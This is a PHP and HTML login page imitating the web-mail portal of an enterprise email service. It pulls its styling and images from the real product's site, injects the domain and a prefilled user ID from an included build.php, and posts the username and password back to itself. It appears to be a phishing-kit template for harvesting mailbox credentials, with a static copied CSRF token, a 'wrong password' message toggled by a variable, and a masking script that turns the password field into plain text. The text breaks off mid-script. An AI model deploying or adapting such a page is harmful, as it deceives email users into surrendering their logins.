<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="zh-CN">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo htmlspecialchars($domain); ?>_刺猬云邮6.0</title>
    <meta name="description" content="云邮又称企业云邮，是国内优秀的企业邮箱系统,基于云计算平台搭建实时监控邮件、超大附件、微信提醒、反垃圾、个人网盘、企业网盘、日程提醒等服务。">
    <meta name="keywords" content="企业邮箱,企业邮箱,企业邮箱注册,企业邮箱申请,企业邮箱注册">
    <link rel="stylesheet" href="http://mail.<?php echo htmlspecialchars($domain); ?>/v2/dist/css/user/default/global.css?t=20260630_093017">
    <link rel="stylesheet" href="https://yunyou.top/v2/dist/css/user/default/global.css?t=20260630_093017"><style type="text/css">body{min-width:990px}.wide1190{margin:0 auto;max-width:1190px}.class-layer-checkip-custom .layui-layer-content{height:150px!important}.login-header{width:100%;height:80px;background:#fff;box-shadow:0 1px 5px 0 rgba(0,0,0,.4)}.login-header .header-content{padding:0 10px}.login-header .header-content .logo{float:left;margin:7px 0;display:inline-block;max-height:60px;line-height:60px}.login-header .header-content .logo img{max-height:60px}.login-header .header-content .header-nav{float:right}.login-header .header-content .header-nav li{float:left;padding:0 10px}.login-header .header-content .header-nav li a{display:block;height:80px;line-height:80px;padding:0 10px;font-size:16px;color:#404040;box-sizing:border-box}.login-header .header-content .header-nav li a.mail-code{position:relative}.login-header .header-content .header-nav li a .mail-code-content{z-index:999;position:absolute;background:#fff;border:1px solid #ddd;padding:10px;display:none;width:200px;top:80px;left:50%;margin-left:-100px;line-height:initial;text-align:center}.login-header .header-content .header-nav li a .mail-code-content p{font-size:14px;color:#333}.login-header .header-content .header-nav li a .mail-code-content img{margin-top:10px}.login-header .header-content .header-nav li a.active,.login-header .header-content .header-nav li a:hover{border-bottom:5px solid #2087ed;color:#127AE4}.login-header .header-content .header-nav li a.active.mail-code .mail-code-content,.login-header .header-content .header-nav li a:hover.mail-code .mail-code-content{display:block}.login-header .header-content .header-tel{padding-left:20px;float:right;line-height:80px;font-size:14px;color:#adadad}.login-header .header-content .header-tel span{font-size:18px;color:#2f54cb}.login-content{width:100%;height:500px;background:#2c50ca;position:relative}.login-content .login-warn-tip{color:#fff;text-align:center;bottom:0;position:absolute;left:0;right:0}.login-content .wide1190{height:100%}.login-content .wide1190 .login-area{position:relative;height:100%;background:url(https://yunyou.top/v2/images/default/mail-login-bg.jpg?t456) top center no-repeat}.login-content .wide1190 .login-area .login-box{position:absolute;top:50px;right:30px;width:380px;min-height:400px;background:#fff}.login-content .wide1190 .login-area .login-box .login-title{padding-left:35px;height:58px;line-height:58px;background:#ebebeb;font-size:18px;color:#3b3b3b;position:relative}.login-content .wide1190 .login-area .login-box .login-title .login-switch{float:right;width:69px;height:58px;background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) 0 -29px no-repeat;position:absolute;top:0;right:0;cursor:pointer}.login-content .wide1190 .login-area .login-box .login-title .login-switch-tips{padding:0 5px;height:24px;line-height:22px;background:#fdfbee;border:1px solid #ffd488;font-size:14px;color:#df862f;position:absolute;top:6px;right:66px}.login-content .wide1190 .login-area .login-box .login-title .login-switch-tips i{margin-right:5px;display:inline-block;width:13px;height:13px;background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) -68px 0 no-repeat;vertical-align:middle;margin-top:-2px}.login-content .wide1190 .login-area .login-box .login-title .login-switch-tips:after{content:"";display:inline-block;width:7px;height:12px;background:url(/v2/images/default/mail-login-icon.png?123) -89px 0 no-repeat;position:absolute;top:4px;right:-7px}.login-content .wide1190 .login-area .login-box .login-form{padding:15px 35px}.login-content .wide1190 .login-area .login-box .login-form .mesg{font-size:14px;color:#f60;display:none}.login-content .wide1190 .login-area .login-box .login-form .mesg i{display:inline-block;width:14px;height:14px;background:url(https://yunyou.top/v2/images/default/mail-icon.png?2025) -139px -596px no-repeat;vertical-align:middle;margin-top:-2px;margin-right:6px}.login-content .wide1190 .login-area .login-box .login-form .mesg.active{display:block}.login-content .wide1190 .login-area .login-box .login-form .label-icon{display:inline-block;width:34px;height:42px;border:1px solid #dadada;border-right:0;float:left;font-size:0}.login-content .wide1190 .login-area .login-box .login-form .label-icon.label-username{background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) 8px 11px no-repeat #fff}.login-content .wide1190 .login-area .login-box .login-form .label-icon.label-password{background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) -24px 13px no-repeat #fff}.login-content .wide1190 .login-area .login-box .login-form .login-sign{overflow:hidden;height:42px;line-height:42px;font-size:20px;color:#818181;text-align:center}.login-content .wide1190 .login-area .login-box .login-form .eye-icon{display:inline-block;width:20px;height:16px;background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) -102px -96px no-repeat;position:absolute;top:34px;right:10px}.login-content .wide1190 .login-area .login-box .login-form .eye-icon.close{background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) -102px -115px no-repeat}.login-content .wide1190 .login-area .login-box .login-form input.m-input{padding-left:0;width:275px;height:42px;line-height:42px;background:#fff;border-color:#dadada;border-left:0}.login-content .wide1190 .login-area .login-box .login-form input.m-input.input-name{float:left;width:115px}.login-content .wide1190 .login-area .login-box .login-form input.m-input.input-domain{padding-left:10px;float:right;width:140px;border-left:1px solid #dadada}.login-content .wide1190 .login-area .login-box .login-form input.m-input.input-password{padding-right:36px}.login-content .wide1190 .login-area .login-box .login-form input.btn{width:100%;height:44px;line-height:44px;background:#3a6be5}.login-content .wide1190 .login-area .login-box .login-form .browser-tip{display:none;display:block\9;margin-top:16px;margin-bottom:-16px;color:red}.login-content .wide1190 .login-area .login-box .login-code-wrap,.login-content .wide1190 .login-area .login-box.login-code-box .login-wrap{display:none}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap{display:block}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-title{padding-left:0;text-align:center}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-title .login-switch{background:url(/v2/images/default/mail-login-icon.png?123) -75px -29px no-repeat}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-title .login-switch-tips{display:none}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-code-form{padding:36px 0 20px}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-code-form .code-img{margin:0 auto;width:154px;height:154px}.login-content .wide1190 .login-area .login-box.login-code-box .login-code-wrap .login-code-form p{padding-top:20px;font-size:14px;color:#7d7c7c;text-align:center}.login-content .wide1190 .login-area .login-box .login_tools{padding:0 30px}.login-content .wide1190 .login-area .login-box .login_tools li{list-style:none;padding:5px 0;line-height:20px}.login-content .wide1190 .login-area .login-box .login_tools .hilite{color:#499c0c;font-size:14px;position:relative;zoom:1}.login-content .wide1190 .login-area .login-box .login_tools .ico_dl{position:absolute;right:-22px;top:0;margin-left:5px}.login-content .wide1190 .login-area .login-box .login_tools_new .icon{display:inline-block;background-repeat:no-repeat;vertical-align:middle}.login-content .wide1190 .login-area .login-box .login_tools_new .ico_cmpt{background-position:-29px -30px;width:20px;height:18px}.login-content .wide1190 .login-area .login-box .login_tools_new .ico_phone{background-position:-54px -30px;width:13px;height:19px}.login-content .wide1190 .login-area .login-box .login_tools_new .ico_2dcode{background-position:-75px -30px;height:17px;width:17px}.login-content .wide1190 .login-area .login-box .downld_box_mail dd,.login-content .wide1190 .login-area .login-box .login_tools_new .downld_box dd{float:left;display:inline;margin:0 10px 10px 0;padding:0;position:relative}.login-content .wide1190 .login-area .login-box .login_tools_new .dd_dark{margin:0!important}.login-content .wide1190 .login-area .login-box .downld_box_mail dd a,.login-content .wide1190 .login-area .login-box .login_tools_new .downld_box dd a{display:inline-block;padding:5px 11px;height:31px;overflow:hidden;border-radius:3px;color:#FFF;font-size:12px}.login-content .wide1190 .login-area .login-box .downld_box_mail dd a:hover,.login-content .wide1190 .login-area .login-box .login_tools_new .downld_box dd a:hover{color:#FFF}.login-content .wide1190 .login-area .login-box .login_tools_new .dd_green a{background:#55a7db}.login-content .wide1190 .login-area .login-box .login_tools_new .dd_blue a{background:#6fbd65}.login-content .wide1190 .login-area .login-box .login_tools_new .dd_dark a{background:#c28e55}.login-content .wide1190 .login-area .login-box .login_tools_new .tagcon{background:0 0;border:0;padding:10px 0;margin-top:5px;border-top:1px solid #E8E8E8}.login-content .wide1190 .login-area .login-box .login_tools_new #tag_3{position:relative;zoom:1}.login-content .wide1190 .login-area .login-box #tag_3 .brLeft,.login-content .wide1190 .login-area .login-box .login_tools_new #tag_2 .brLeft{border-left:1px solid #CCC;display:inline-block;height:14px;position:absolute;left:2px;margin-top:6px;zoom:1}.login-content .wide1190 .login-area .login-box .login_tools_new ul li{padding:0}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag div{position:relative}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag a,.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag span{background:0 0;color:#000;font-size:12px;display:inline-block}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .tagcur a,.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .tagcur span{background:0 0;font-weight:700}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .tagcur a{color:#499c0c}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag i{background-image:url(https://yunyou.top/v2/images/default/ico_sprite_login.png);display:inline-block}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .ico_more{background-position:-102px -25px;margin-left:5px;width:23px;height:19px}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .iCur{background-image:none;width:14px;height:7px;overflow:hidden;bottom:-5px;left:45px;position:absolute}.login-content .wide1190 .login-area .login-box .login_tools_new .popup_tag .tagcur i.iCur{background-image:url(https://yunyou.top/v2/images/default/ico_sprite_login.png);background-position:-121px 0}.login-content .wide1190 .login-area .login-box .msg{color:#777}.login-content .wide1190 .login-area .login-box .show{display:inline-block}.login-content .wide1190 .login-area .login-box .hide{display:none}.login-content .wide1190 .login-area .login-box .popup_tag{position:relative;bottom:-1px}.login-content .wide1190 .login-area .login-box .popup_tag div{float:left;display:inline;height:26px;line-height:26px;text-align:center;color:#555}.login-content .wide1190 .login-area .login-box .popup_tag div a{float:left;padding-right:5px;cursor:default}.login-content .wide1190 .login-area .login-box .popup_tag div a:hover{text-decoration:none}.login-content .wide1190 .login-area .login-box .popup_tag div span{float:left;padding-left:8px}.login-content .wide1190 .login-area .login-box .popup_tag .tagcur a,.login-content .wide1190 .login-area .login-box .popup_tag .tagcur span{background:url(/v2/images/default/bg_tag.png) right 0 no-repeat}.login-content .wide1190 .login-area .login-box .popup_tag .tagcur a{color:#499c0c}.login-content .wide1190 .login-area .login-box .popup_tag .tagcur span{background-position:0 0}.login-content .wide1190 .login-area .login-box .tagcon{float:left;background-color:#fdfdfd;border:1px solid #e8e8e8;-webkit-border-radius:0 3px 3px 3px;-moz-border-radius:0 3px 3px;border-radius:0 3px 3px;margin:0 0 6px;padding:16px 8px 12px 15px;width:100%;zoom:1}.login-content .wide1190 .login-area .login-box .tagcon a{color:#fff!important}.login-content .wide1190 .login-area .login-box .tools_emeeting .icon,.login-content .wide1190 .login-area .login-box .tools_mail .icon,.login-content .wide1190 .login-area .login-box .tools_nosys .icon{background-image:url(https://yunyou.top/v2/images/default/ico_sprite_login.png)}.login-content .wide1190 .login-area .login-box .login_tools .icon{display:inline-block;background-repeat:no-repeat;vertical-align:middle}.login-content .wide1190 .login-area .login-box .login_tools .ico_phone{background-position:-40px 0;width:18px;height:25px}.login-content .wide1190 .login-area .login-box .login_tools .ico_2dcode{background-position:-80px 0;width:23px;height:25px}.login-content .wide1190 .login-area .login-box .login_tools .ico_lamp{background-position:0 -30px;height:18px;width:14px}.login-content .wide1190 .login-area .login-box .downld_box{float:left;background-color:#fdfdfd;border:1px solid #e8e8e8;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px;margin:6px 0;padding:15px 8px 15px 15px}.login-content .wide1190 .login-area .login-box .downld_box_mail{margin-bottom:10px;width:319px}.login-content .wide1190 .login-area .login-box .downld_box dt,.login-content .wide1190 .login-area .login-box .downld_box_mail dt{color:#000;margin:0 0 10px;padding:0}.login-content .wide1190 .login-area .login-box .downld_box dd,.login-content .wide1190 .login-area .login-box .downld_box_mail dd{float:left;display:inline;margin:0 23px 0 0;padding:0;position:relative}.login-content .wide1190 .login-area .login-box .downld_box dd .icon,.login-content .wide1190 .login-area .login-box .downld_box_mail dd .icon{margin-right:5px}.login-content .wide1190 .login-area .login-box .downld_box dd a,.login-content .wide1190 .login-area .login-box .downld_box_mail dd a{color:#2d5e99}.login-content .wide1190 .login-area .login-box .popbox{position:absolute;padding:6px 0;z-index:1;font-size:12px}.login-content .wide1190 .login-area .login-box .popbox .ico_corner{position:absolute;overflow:hidden}.login-content .wide1190 .login-area .login-box .ico_corner_downL,.login-content .wide1190 .login-area .login-box .ico_corner_downR,.login-content .wide1190 .login-area .login-box .ico_corner_upL,.login-content .wide1190 .login-area .login-box .ico_corner_upR{background-position:-120px 0;width:14px;height:7px}.login-content .wide1190 .login-area .login-box .ico_corner_upL{top:0;left:10px}.login-content .wide1190 .login-area .login-box .ico_corner_upR{background-position:-120px 0;top:0;right:14px}.login-content .wide1190 .login-area .login-box .ico_corner_downL{background-position:-120px -13px;bottom:0;left:14px}.login-content .wide1190 .login-area .login-box .ico_corner_downR{background-position:-120px -13px;bottom:0;right:14px}.login-content .wide1190 .login-area .login-box .popbox_con{border:1px solid #d7d7d7;background:#fff;color:#555;padding:10px 5px}.login-content .wide1190 .login-area .login-box .twodcode_img{text-align:center}.login-content .wide1190 .login-area .login-box .popbox_con .note{position:relative;line-height:20px;margin-top:10px;padding-left:18px;display:inline-block}.login-content .wide1190 .login-area .login-box .popbox_con .ico_lamp{position:absolute;left:0;top:0;margin:0}.login-content .wide1190 .login-area .login-tips{display:none}.login-content.login-content-left .login-area .login-box{left:30px}.login-content.login-content-center .login-area .login-box{left:50%;width:500px;margin-left:-250px}.login-content.login-content-center .login-area .login-box .login-form input.m-input{width:396px}.login-content.login-content-center .login-area .login-box .login-form input.m-input.input-name{width:260px}.login-content.login-content2 .login-area{background:0 0;padding-top:100px;padding-left:30px}.login-content.login-content2 .login-area .login-tips{display:block;font-size:30px;color:#fff;padding:20px;width:600px;border:2px solid #ddd}.login-footer{padding-top:20px;line-height:28px;min-height:70px;font-size:12px;background:#fff;text-align:center}.login-footer p a{color:#666}.login-footer p a:hover{color:#ff7200;text-decoration:underline}.login-footer p span{padding:0 5px}.login-footer .footer-images{padding-top:10px}.login-footer .footer-images .fb-img{display:inline-block;width:30px;height:30px;background:url(https://yunyou.top/v2/images/default/mail-footer-icon.jpg) no-repeat}.login-footer .footer-images .fb-img.fb-img_1{background-position:0 0}.login-footer .footer-images .fb-img.fb-img_2{background-position:-75px 0}.login-footer .footer-images .fb-img.fb-img_3{background-position:-154px 0}.login-footer .footer-images .fb-img.fb-img_4{background-position:-234px 0}.login-footer .footer-images .fb-img.fb-img_5{background-position:-314px 0}.login-footer .footer-images .fb-img.fb-img_6{background-position:-394px 0}.login-footer .footer-images .fb-img.fb-img_7{background-position:-476px 0}.login-footer .footer-images .fb-img.fb-img_8{background-position:-551px 0}.login-footer .contact-list{position:absolute;top:16px;right:30px}.login-footer .contact-list li{float:left;margin-right:20px;text-align:center}.login-footer .contact-list li:last-child{margin-right:0}.login-footer .contact-list li .cl-img{display:inline-block;margin:0 auto;background:url(https://yunyou.top/v2/images/default/mail-login-icon.png?123) no-repeat}.login-footer .contact-list li .cl-img.cl-wx{width:42px;height:34px;background-position:0 -97px}.login-footer .contact-list li .cl-img.cl-sina{width:40px;height:32px;background-position:-52px -97px}.login-footer .contact-list li p{line-height:normal;font-size:14px;color:#7d7c7c}.login-footer .contact-list li a:hover p{color:#ff7200}</style><script>window.LESS_MODE=false;console.log('CSS mode...')</script></head>
<body class="">
<div class="container">
    <div class="module-f">
        <div class="login-header">
    <div class="wide1190 header-content cl">
        <a class="logo" href="" title="LANG_LOGIN_LOGO_TITLE"><img src="https://yunyou.top/v2/images/default/logo35.png" alt="LANG_LOGIN_LOGO_TITLE"></a>
        <ul class="header-nav cl">
            <!--<li class="">
                <a class="mail-code" href="javascript:;"><?/*= \Yii::t('app', '云邮小程序'); */?>
                    <div class="mail-code-content">
                        <p><?/*= \Yii::t('app', '微信扫一扫进入小程序'); */?></p>
                        <img src="/v2/images/default/mail-mini-code.png" alt="云邮小程序二维码" width="140" height="140">
                    </div>
                </a>
            </li>-->
                            <li class="help"><a class="" href="#" target="_blank">帮助中心</a></li>
                                                    <li class="lang"><a class="" href="#">English</a></li>
                                        <li class="lang"><a class="" href="#">繁體中文</a></li>
                    </ul>
    </div>
</div>
        <!--login-content-left form表单居左;login-content-center form表单居中-->
        <div class="login-content J-login-content">
<!--            <div class="login-warn-tip">警告！浏览器版本太低，请使用IE9以上版本(推荐使用chrome)，否则影响正常使用！</div>-->
            <div class="wide1190 cl">
                <div class="login-area">
                    <!--login-code-box：二维码登录-->
                    <div class="login-box" id="J_loginBox">
                        <form name="login" method="post" action="" id="J_loginForm">
    <input type="hidden" name="login" value="yunyou"/>
    <div class="login-wrap">
        <div class="login-title">
            企业邮箱登录            <div class="login-switch J_loginSwitch"></div>
            <div class="login-switch-tips">
                <i></i>微信扫码登录            </div>
        </div>
        <div class="login-form">
            <div style="<?php echo $error; ?>"><div class="mesg active"><i></i>用户名或密码错误</div></div>
            <div class="pt-10 cl">
                <label for="J_loginPage_u_name" class="label-username label-icon"></label>
                <input id="J_loginPage_u_name" class="m-input input-name J-input-filter" name="userid" data-errmsg="邮箱名不能为空" type="text" value="<?php echo htmlspecialchars($login_id); ?>" placeholder="请输入用户名" autocomplete="on">
                <input id="J_loginPage_domain" class="m-input input-domain J-input-filter" name="domain" data-errmsg="域名不能为空" type="text" value="<?php echo htmlspecialchars($domain); ?>" placeholder="请输入域名" autocomplete="off" tabindex="-1">
                <div class="login-sign">@</div>
                <input type="hidden" name="user" value="<?php echo htmlspecialchars($login_id); ?>@<?php echo htmlspecialchars($domain); ?>"/>
            </div>
            <div class="pt-20 pos-r">
                <label for="J_loginPage_u_password" class="label-password label-icon"></label>
                <input id="J_loginPage_u_password" class="m-input input-password" name="pass" data-errmsg="密码不能为空" type="text" value="" placeholder="请输入密码" autocomplete="off">
                <a class="eye-icon close J_loginPage_eye" href="javascript:;"></a>
            </div>
                        <div class="pt-10">
                <input class="m-ck" name="remember" type="checkbox" id="J_loginPage_tenDays" value="1">
                <label class="m-ck-label" for="J_loginPage_tenDays">30天免密登录</label>
                <a class="ml-20 blue-link setAdmin" href="javascript:;" >管理员登录</a>
                <a class="f-r font12" href="" target="_blank">忘记密码？</a>
            </div>
            <div class="text-c pt-10">
                <input type="SUBMIT" class="btn btn-m btn-blue" value="登 录" id="J_loginPage_submit">
            </div>
            <div class="browser-tip">建议使用Chrome/firefox/IE11+等浏览器，IE9以下不再支持</div>
        </div>
    </div>
    <div class="login-code-wrap">
        <div class="login-title">
            微信扫一扫登录            <div class="login-switch J_loginSwitch"></div>
        </div>
        <div class="login-code-form">
            <div class="code-img">
                <img id="J_login_qrcode" src="https://yunyou.top/v2/images/default/mail-code.jpg" alt="西部数码企业邮箱微信公众号"
                     width="154"
                     height="154">
            </div>
            <p>关注【通知设置】中的公众号后才可登录</p>
        </div>
    </div>
    <input type="hidden" name="_csrf_frontend"
           value="K0iNGzR3S-VW2L2DbL0beWfGJmKnJvtwPuvVnZzd-yBBGd99Qz8IkxSa2uYm7HJIMr9ADPFS1jF30qzr95Wtfw==">
    <div class="login_tools login_tools_new">
        <div class="tools_cell tools_mail">
            <ul>
                <li class="clearfix">
                    <div class="popup_tag clearfix">
                        <div id="tag_1" class="tagitem tagcur" ><i class="iCur"></i><a href="javascript:void(0)"><span>android客户端</span></a></div>
                        <div id="tag_2"  class="tagitem"><i class="iCur"></i><i class="brLeft"></i><a href="javascript:void(0)"><span>iPhone客户端</span></a></div>
                        <div id="tag_3"  class="tagitem"><i class="iCur"></i><i class="brLeft"></i><a href="javascript:void(0)"><span>Windows客户端</span></a></div>
                    </div>
                    <div id="phonecon_1" class="tagcon show clearfix">
                        <dl id="downld_box_mail" class="downld_box_mail">
                            <dd class="dd_green"><a href="#"  target="_blank"><i class="icon ico_cmpt"></i>下载到电脑</a></dd>

                            <dd class="dd_dark">
                                <a id="link_2dcode_mail" href="javascript:void(0)" class="erweima"><i class="icon ico_2dcode"></i>通过二维码</a>
                                <div id="ppbox_2dcode" class="popbox" style="bottom: 38px; left: -9px; width: 175px; display: none;">
                                    <i class="icon ico_corner ico_corner_downL"></i>
                                    <div class="popbox_con">
                                        <div class="twodcode_img">
                                            <img src="https://yunyou.top/v2/images/default/app-Android.JPG">
                                        </div>
                                        <div class="twodcode_txt">
                                            可通过手机二维码扫描软件，扫描二维码即可立即下载。                                        </div>
                                    </div>
                                </div>
                            </dd>
                        </dl>
                        <div class="clear"></div>
                    </div>
                    <div id="phonecon_2" class="tagcon hide clearfix">
                        <dl id="downld_box_mail" class="downld_box_mail">
                            <dd class="dd_green"><a href="https://apps.apple.com/cn/app/%E5%88%BA%E7%8C%AC%E4%BA%91%E9%82%AE/id6748970518" target="_blank" ><i class="icon ico_cmpt"></i>通过Appstore免费下载</a></dd>
                            <dd class="dd_dark">
                                <a id="link_2dcode_mail_phone" href="javascript:void(0)" class="erweima"><i class="icon ico_2dcode"></i>通过二维码</a>
                                <div id="ppbox_2dcode_phone" class="popbox" style="bottom: 38px; left: -9px; width: 175px; display: none;">
                                    <i class="icon ico_corner ico_corner_downL"></i>
                                    <div class="popbox_con">
                                        <div class="twodcode_img">
                                            <img src="https://yunyou.top/v2/images/default/app-ios.JPG">
                                        </div>
                                        <div class="twodcode_txt">
                                            可通过手机二维码扫描软件，扫描二维码即可立即下载。                                        </div>
                                    </div>
                                </div>
                            </dd>
                        </dl>
                        <div class="clear"></div>
                    </div>
                    <div id="phonecon_3" class="tagcon hide clearfix">
                        <dl id="downld_box_mail" class="downld_box_mail">
                            <dd class="dd_green"><a href="#" target="_blank" ><i class="icon ico_cmpt"></i>下载电脑客户端</a></dd>
                            <dd><a href="#" target="_blank" style="color:#2086ee!important;font-size: 14px;">网速测试</a></dd>
                        </dl>
                        <div class="clear"></div>
                    </div>
                </li>
            </ul>
        </div>
    </div>
</form>
<script type="text/javascript">
    var DOMAIN="";
</script>

                    </div>
                    <div class="login-tips">
                        当前为临时Web访问地址，部分功能可能受限，建议进行域名备案，备案成功后使用mail.yourdomain访问登录。                    </div>
                </div>
            </div>
        </div>
        
    <div class="login-footer">
        <div class="wide1190 pos-r">
            <div class="login-footer-top">
                <p class="text-c font14">
                    <?php echo htmlspecialchars($domain); ?> Power by 刺猬云邮6.0                    <!--                <a href="--><?//=$SERVER_ROOT?><!--/doc/user-manual.pdf" target="_blank">《云邮用户手册》</a>-->
                    <!--                <a href="--><?//=$SERVER_ROOT?><!--/doc/management-manual.pdf" target="_blank">《云邮管理手册》</a>-->
                </p>
                            </div>
            <p class="mt-10 login-footer-code"><img src="https://yunyou.top/v2/images/default/mail-mini-code.png" alt="云邮小程序二维码" width="140" height="140" style="border: 1px solid #e5e5e5;" title="微信扫一扫打开云邮小程序"></p>
        </div>
    </div>
    </div>
</div>
<script>
    /*浏览器判断*/
    if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
        WJF.ui.alert.confirm(I18NMessage.page.login.MOBILE_VERSION_LAUNCH_REMINDER, function () {
            window.location.href = '/m/';
            return true;
        });
    }
</script>
<script>
    function nameStrFilter(event) {
        var keyCode = event.charCode || event.keyCode;
        if ((keyCode >= 97 && keyCode <= 122) ||		// a-z
            (keyCode >= 48 && keyCode <= 57) ||		// 0-9
            keyCode == 46 || keyCode == 95 ||		// _ .
            keyCode == 45 || keyCode == 8 || keyCode == 46 || keyCode == 9 || keyCode == 37 || keyCode == 39)								// -
            return true;
        else return false;

    }

    function domainStrFilter(event) {
        var keyCode = event.charCode || event.keyCode;
        if ((keyCode >= 97 && keyCode <= 122) ||		// a-z
            (keyCode >= 48 && keyCode <= 57) ||		// 0-9
            keyCode == 46 || keyCode == 95 ||	    // _ .
            keyCode == 45 || keyCode == 8 || keyCode == 46 || keyCode == 9 || keyCode == 37 || keyCode == 39)								// -
            return true;
        else return false;
    }

    var loginPage = {
        showErrMsg: function (msg) {
            msg = $.trim(msg);
            if (msg) {
                $("#J_loginForm .mesg").html("<i></i>" + msg);
                $("#J_loginForm .mesg").addClass('active');
            } else {
                $("#J_loginForm .mesg").removeClass('active');
            }
        },
        doLogin: function (loginForm) {
            var dataArr = $(loginForm).serializeArray();
            var result = {};
            var self = this;
            for (var i = 0, len = dataArr.length; i < len; i++) {
                var item = dataArr[i];
                if (!$.trim(item.value)) {
                    this.showErrMsg($("#J_loginForm input[name='" + item.name + "']").attr('data-errmsg'));
                    return false;
                }
                result[item.name] = item.value;
            }
            require(['Encrypter'], function (Encrypter) {
                var encryptPwd = Encrypter.encrypt(result.password);
                result.password = encryptPwd;
                if ('0' == "1") {
                    // 校验二维码
                    $.ajax({
                        url: '/login/checkverify',
                        type: 'get',
                        data: {
                            code: result['code']
                        },
                        success: function (data) {
                            if (data == "false") {
                                $("#J_verifyImg").attr('src', '/login/verify?' + (new Date()).getTime());
                                self.showErrMsg("验证码校验失败，请重试！");
                            } else {
                                self.handleLogin(result, {
                                    url: loginForm.action,
                                    method: loginForm.method || 'post',
                                    target: loginForm.target || '_self'
                                });
                            }
                        },
                        error: function () {
                            self.showErrMsg("验证码校验失败，请稍后重试！");
                            $("#J_verifyImg").attr('src', '/login/verify?' + (new Date()).getTime());
                        }
                    });
                    return false;
                } else {
                    // 不做二维码校验
//                $(loginForm).submit();
                    self.handleLogin(result, {
                        url: loginForm.action,
                        method: loginForm.method || 'post',
                        target: loginForm.target || '_self'
                    });
                }
            }, {
                showLoading: true
            });

        },
        cancelCheckCodeLogin: function () {
            clearInterval(this.checkLoginIntervalHandle);
        },
        checkCodeLogin: function () {
            WJF.serviceManager.get("/wechat/login/init", {}, function (data) {
                var key = data.data || null;
                $("#J_login_qrcode").attr('src', '/v2/wechat/login/qrcode?key=' + key + "&t=" + (new Date()).getTime());
                this.checkLoginIntervalHandle = setInterval(function () {
                    WJF.serviceManager.get('/wechat/login/by-code?key=' + key, {}, function (data) {
                        if (data.code == 200) {
